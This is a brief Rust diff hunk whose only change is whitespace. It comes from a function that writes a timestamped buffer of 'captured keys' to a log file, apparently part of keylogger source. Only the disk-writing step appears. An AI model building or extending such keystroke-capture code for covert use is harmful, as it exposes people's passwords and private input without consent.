@@ -50,7 +50,7 @@ fn log_keys_to_disk(captured_keys_buffer: String, log_file: String) -> Result<()
         .create(true)
         .open(log_file)
         .unwrap();
-
+    
     write!(file, "{}", format!("{}: {}\n", time_now, captured_keys_buffer))?;
     Ok(())
 }
